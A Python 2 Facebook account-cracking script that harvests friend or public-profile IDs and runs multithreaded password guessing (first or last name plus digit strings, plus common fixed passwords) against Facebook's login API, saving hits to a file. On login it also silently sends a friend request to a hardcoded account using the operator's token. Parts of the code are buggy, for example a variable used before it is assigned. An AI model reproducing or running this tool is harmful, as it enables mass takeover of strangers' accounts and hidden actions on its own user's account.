#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

manglist = requests.get('https://raw.githubusercontent.com/hamaiosdev/IDHAMA/main/id.txt')
idd = manglist.text
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]



def keluar():
    print "\033[1;96m[!] \x1b[1;91mExit"
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(00000.1)


#### LOGO ####
logo = """                                                      
                                                      
                             \033[91m @@                      
                     /@,    @@&@@%@@ &                
                  @@&.      @@&&&@@@@@#  ,            
                .@&      @@@&&&@@    / .@@@@          
               @@      /@@&&&&@@      @@/ @@@&        
              @@      @@&&&&&&@@@%&@@@,               
             *@@     /@@&&&&&@#  @@/     /@@          
             .@@    *&@&&&&&&@&           @@          
                   ,  @&&&&&&&&@&(       /@@          
          @,  &@    (@@&&&&&@ @@@@       &            
                @@@@  @&&@@@&.@@@@@@@   #(            
                     @*              .                
                     @%      .@@@@@@@.                
\033[91m______  __      ______  ___      ________     ___    __
\033[91m___  / / /_____ ___   |/  /_____ ___  __ \______ |  / /
\033[97m__  /_/ /_  __ `\033[33m/_  /|_/ /_  __ `/_  / / \033[97m/  _ \_ | / / 
\033[97m_  __  / / /_/ \033[33m/_  /  / / / /_/ /_  /_/ /\033[97m/  __/_ |/ /  
\033[32m/_/ /_/  \__,_/ /_/  /_/  \__,_/ /_____/ \___/_____/    
\033[33m..............................................
\033[31mOWNER\033[33m: \033[32mHaMa Dev              
						     
\033[31mDEV\033[33m: \033[32mHAMA            	     
						     
\033[31mTelegram\033[33m: \033[32mxxxHAMAxx
\033[33m.............................................."""
def tik():
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\x1b[1;93mLOGINING \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mbardast nya"
vuln = "\033[32mbardasta"

os.system("clear")
print ""

 

def login():
    os.system('clear')
    try:
        toket = open('login.txt','r')
        menu() 
    except (KeyError,IOError):
        os.system('clear')
        print logo
        print "\033[1;33m"
        print('\033[30m================\x1b[1;94mLOGIN FACEBOOK\033[30m================ ' )
        id = raw_input(' \x1b[0;93mID/Email/Num \x1b[1;92m: \x1b[1;96m')
        pwd = raw_input(' \x1b[0;93mPassword \x1b[1;92m: \x1b[1;96m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print"\n\033[1;96m[!] \x1b[1;91mInvalid email or password"
            keluar()
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
                x=hashlib.new("md5")
                x.update(sig)
                a=x.hexdigest()
                data.update({'sig':a})
                url = "https://api.facebook.com/restserver.php"
                r=requests.get(url,params=data)
                z=json.loads(r.text)
                unikers = open("login.txt", 'w')
                unikers.write(z['access_token'])
                unikers.close()
                print '\n\x1b[1;36;40m[✓] Login Susccsufully ...'
                os.system('xdg-open https://t.me/HAMADEVCHANNEL')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
                menu()
            except requests.exceptions.ConnectionError:
                print"\n\x1b[1;91m[!] No Internet"
                keluar()
        if 'checkpoint' in url:
            print("\n\x1b[1;92m[!] Account on Checkpoint")
            os.system('rm -rf login.txt')
            time.sleep(1)
            keluar()
        else:
            print("\n\x1b[1;93mInvalid email or password")
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()


def menu():
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        os.system('clear')
        print"\x1b[1;91m[!] Tokin is not finished"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
        ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
        b = json.loads(ots.text)
        sub = str(b['summary']['total_count'])
    except KeyError:
        os.system('clear')
        print"\033[1;91mAccount on Checkpoint"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print"\x1b[1;92mNo Intrnet"
        keluar()
    os.system("clear")
    print logo
    print "\033[1;32;40m[1] \033[1;96;40m══$ START CRACKING"    
    print "\033[1;32;40m[2] \033[1;96;40m══$ UPDATE TOOL"                                                                                                                        
    print "\033[1;32;40m[0] \033[1;96;40m══$ LOGOUT"
    pilih()

def pilih():
    unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
    if unikers =="":
        print "\x1b[1;91mYour number is incorrect"
        pilih()
    elif unikers =="1":
        super()
    elif unikers =="2":
        os.system('clear')
        print logo
        print " \033[1;36;40m●=========~~~~~~~=====~~~~~======~~~~~~~====+\n"
        os.system('git pull origin master')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBACK \x1b[1;91m]')
        menu()
    elif unikers =="0":
        jalan('An account was closed')
        os.system('rm -rf login.txt')
        keluar()
    else:
        print "\x1b[1;91mYour number is incorrect"
        pilih()

def super():
    global toket
    os.system('clear')
    try:
        toket=open('login.txt','r').read()
    except IOError:
        print"\x1b[1;91mTokin is not finished"
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    print logo
    print "\x1b[1;32;40m[1] \033[1;91;40m══+ CRACKING From ID of Friend"
    print "\x1b[1;32;40m[2] \033[1;96;40m══+ CRACKING From PUBLIC ID "
    print "\x1b[1;32;40m[3] \033[1;94;40m══+ Gitting Id/mail/num Facebook Account"
    print "\x1b[1;32;40m[4] \033[1;96;40m══+ CRACKING From File"
    print "\x1b[1;32;40m[0] \033[1;91;40m══+ BACK"
    pilih_super()

def pilih_super():
    peak = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
    if peak =="":
        print "\x1b[1;91mYour number is wrong"
        pilih_super()
    elif peak =="1":
        os.system('clear')
        print logo

        jalan('\033[1;93m GITING ALL ID \033[1;97m...')
        r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif peak =="2":
        os.system('clear')
        print logo
        idt = raw_input("\033[1;96m INPUT PUBLIC ID  : ")
        try:
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print"\033[1;31;40m Name : "+op["name"]
        except KeyError:
            print"\x1b[1;91m ID Not Found!"
            raw_input("\n\033[1;96m[\033[1;94mBACK\033[1;96m]")
            super()
        print"\033[1;37;40m GITTING ALL ID ..."
        r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
    elif peak =="3":
        os.system('clear')
        print logo
        os.system('python2 .hamac.py')
        time.sleep(1)   
    elif peak =="4":
        os.system('clear')
        print logo                  
        try:
            idlist = raw_input('\x1b[1;96m \x1b[1;93mType file location\x1b[1;91m: \x1b[1;97m')
            for line in open(idlist,'r').readlines():
                id.append(line.strip())
        except IOError:
            print '\x1b[1;35;40m[!] \x1b[1;35;40mLocation not found'
            raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mBACK \x1b[1;35;40m]')
            super()
    elif peak =="0":
        menu()
    else:
        print "\x1b[1;91mYour number is wrong"
        pilih_super()

    
    print "\033[1;36;40m ALL ID : \033[1;94m"+str(len(id))
    jalan('\033[1;34;40m Please Wait 10min=======30min ...')
    titik = ['.   ','..  ','... ']
    for o in titik:
        print("\r\033[1;32;40m CLONING STARTED\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
    print "\n\033[1;94m        ❈     \x1b[1;31mTo Stop Process Press  CTRL+Z  \033[1;94m    ❈"
    print "   \033[1;36;48m ●🕐═$═$══$═$═$═$═$═$═$══=═<<<>>>═=══$═$═$══$═$═$═🗏"

    print  "  \033[1;33;48m ●🕐═$═$══$═$═$═$═$$═$═══<<<>>>═══$═$═$═$═$═$═$$══🗏" 

    def main(arg):
        global cekpoint,oks
        user = arg
        try:
            os.mkdir('out')
        except OSError:
            pass 
        try:
            a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
            b = json.loads(a.text)
            pass1 = b['first_name'] + '112233'
            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[OK] \x1b[1;92m ' + 'ID: '+ user  + ' PASS: ' + pass1 + ' NAME: ' +  b['name']
                oks.append(user+pass1)
            else:
                if 'www.facebook.com' in q["error_msg"]:
                    print '\x1b[1;36;40m[CP]' + 'ID: ' + user  + ' PASS: ' + pass1 + ' NAME: ' + b['name']
                    cek = open("out/CP.txt", "a")
                    cek.write(user+"|"+pass1+"\n")
                    cek.close()
                    cekpoint.append(user+pass1)
                else:
                    pass2 = b['first_name'] + '12345678'
                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b╔[1;92m[OK]' + 'ID: ' + user  + ' PASS:  ' + pass2 + ' NAME: ' + b['name']
                        oks.append(user+pass2)
                    else:
                        if 'www.facebook.com' in q["error_msg"]:
                            print '\x1b[1;36;40m[CP] \x1b[1;97m '+ 'ID: ' + user  + 'PASS: ' + pass2 + ' NAME ' + b['name']
                            cek = open("out/CP.txt", "a")
                            cek.write(user+"|"+pass2+"\n")
                            cek.close()
                            cekpoint.append(user+pass2)
                        else:
                            pass3 = b['first_name'] + '12345'
                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[OK] \x1b[1;92m ' + 'ID: ' + user  + ' PASS: ' + pass3 + ' NAME: ' + b['name']
                                oks.append(user+pass3)
                            else:
                                if 'www.facebook.com' in q["error_msg"]:
                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + 'ID: ' + user  + ' PASS: ' + pass3 + ' NAME: ' + b['name']
                                    cek = open("out/CP.txt", "a")
                                    cek.write(user+"|"+pass3+"\n")
                                    cek.close()
                                    cekpoint.append(user+pass4)
                                else:
                                    pass4 = b['first_name'] + '1234'
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + 'ID: ' + user  + ' PASS: ' + pass4 + ' NAME: ' + b['name']
                                        oks.append(user+pass4)
                                    else:
                                        if 'www.facebook.com' in q["error_msg"]:
                                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' +'ID: ' + user  + ' PASS: ' + pass4 + ' NAME: ' + b['name']
                                            cek = open("out/CP.txt", "a")
                                            cek.write(user+"|"+pass4+"\n")
                                            cek.close()
                                            cekpoint.append(user+pass4)
                                        else:
                                            pass5 = '112233445566'
                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;92m[OK] \x1b[1;92m '+ 'ID: ' + user  + ' PASS: ' + pass5 + ' NAME: ' + b['name']
                                                oks.append(user+pass5)
                                            else:
                                                if 'www.facebook.com' in q["error_msg"]:
                                                    print '\x1b[1;36;40m[CP] \x1b[1;97m' + 'ID: ' + user  + ' PASS: ' + pass5 + ' NAME: ' + b['name']
                                                    cek = open("out/CP.txt", "a")
                                                    cek.write(user+"|"+pass5+"\n")
                                                    cek.close()
                                                    cekpoint.append(user+pass5)
                                                else:
                                                    pass6 = b['last_name'] + '123'
                                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;92m[OK] \x1b[1;92m ' + 'ID: ' + user  + ' PASS: ' + pass6 + ' NAME: ' + b['name']
                                                        oks.append(user+pass6)
                                                    else:
                                                        if 'www.facebook.com' in q["error_msg"]:
                                                            print '\x1b[1;36;40m[CP] \x1b[1;97m ' + 'ID: ' + user  + ' PASS: ' + pass6 + ' NAME: ' + b['name']
                                                            cek = open("out/CP.txt", "a")
                                                            cek.write(user+"|"+pass6+"\n")
                                                            cek.close()
                                                            cekpoint.append(user+pass6)
                                                        else:
                                                            pass7 = '1234554321'
                                                            data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[1;92m[OK] \x1b[1;92m ' + 'ID: ' + user  + ' PASS: ' + pass7 + ' NAME: ' + b['name']
                                                                oks.append(user+pass7)
                                                            else:
                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                    print '\x1b[1;36;40m[CP] \x1b[1;97m ' + 'ID: ' + user  + ' PASS: ' + pass7 + ' NAME: ' + b['name']
                                                                    cek = open("out/CP.txt", "a")
                                                                    cek.write(user+"|"+pass7+"\n")
                                                                    cek.close()
                                                                    cekpoint.append(user+pass7)
                                                                else:
                                                                    pass8 = '112233445566'
                                                                    data = urllib.urlopen(
                                                                        "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (
                                                                            user) + "&locale=en_US&password=" + (
                                                                            pass8) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print
                                                                        '\x1b[1;92m[OK] \x1b[1;92m ' + 'ID: ' + user + ' PASS: ' + pass8 + ' NAME: ' + \
                                                                        b['name']
                                                                        oks.append(user + pass8)
                                                                    else:
                                                                        if 'www.facebook.com' in q["error_msg"]:
                                                                            print
                                                                            '\x1b[1;36;40m[CP] \x1b[1;97m ' + 'ID: ' + user + ' PASS: ' + pass8 + ' NAME: ' + \
                                                                            b['name']
                                                                            cek = open("out/CP.txt", "a")
                                                                            cek.write(user + "|" + pass8 + "\n")
                                                                            cek.close()
                                                                            cekpoint.append(user + pass8)
                                                                        else:
                                                                            pass9 = '1234512345'
                                                                            data = urllib.urlopen(
                                                                                "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (
                                                                                    user) + "&locale=en_US&password=" + (
                                                                                    pass9) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print
                                                                                '\x1b[1;92m[OK] \x1b[1;92m ' + 'ID: ' + user + ' PASS: ' + pass9 + ' NAME: ' + \
                                                                                b['name']
                                                                                oks.append(user + pass9)
                                                                            else:
                                                                                if 'www.facebook.com' in q["error_msg"]:
                                                                                    print
                                                                                    '\x1b[1;36;40m[CP] \x1b[1;97m ' + 'ID: ' + user + ' PASS: ' + pass9 + ' NAME: ' + \
                                                                                    b['name']
                                                                                    cek = open("out/CP.txt", "a")
                                                                                    cek.write(user + "|" + pass9 + "\n")
                                                                                    cek.close()
                                                                                    cekpoint.append(user + pass9)
                                                                                else:
                                                                                    pass10 = '1122334455'
                                                                                    data = urllib.urlopen(
                                                                                        "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (
                                                                                            user) + "&locale=en_US&password=" + (
                                                                                            pass10) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print
                                                                                        '\x1b[1;92m[OK] \x1b[1;92m ' + 'ID: ' + user + ' PASS: ' + pass10 + ' NAME: ' + \
                                                                                        b['name']
                                                                                        oks.append(user + pass10)
                                                                                    else:
                                                                                        if 'www.facebook.com' in q[
                                                                                            "error_msg"]:
                                                                                            print
                                                                                            '\x1b[1;36;40m[CP] \x1b[1;97m ' + 'ID: ' + user + ' PASS: ' + pass10 + ' NAME: ' + \
                                                                                            b['name']
                                                                                            cek = open("out/CP.txt",
                                                                                                       "a")
                                                                                            cek.write(
                                                                                                user + "|" + pass10 + "\n")
                                                                                            cek.close()
                                                                                            cekpoint.append(
                                                                                                user + pass10)
        except:                                                                        
            pass
        
    p = ThreadPool(30)
    p.map(main, id) 
    
    print '\033[1;31;40mCracking End\033[1;96m ....'
    print "[+] ALL CRACKING\033[1;32;40mOK\033[1;36;40m/\033[1;31;40mCP \033[1;36;40m: \033[1;32;40m"+str(len(oks))+"\033[1;36;40m/\033[1;31;40m"+str(len(cekpoint))
    print '\033[1;34;40mOK File Sa,ved in  : save/cp.txt'
    print """
\033[1;31;40m ●═$═$══$═$═$═$═$═$═$══<<<<.>>>>══$══$═$═$═$═$═$═$═$═$═$═●
           """
    raw_input("\n\033[1;96m[\033[1;97mBACK\033[1;96m]")
    super()

login()
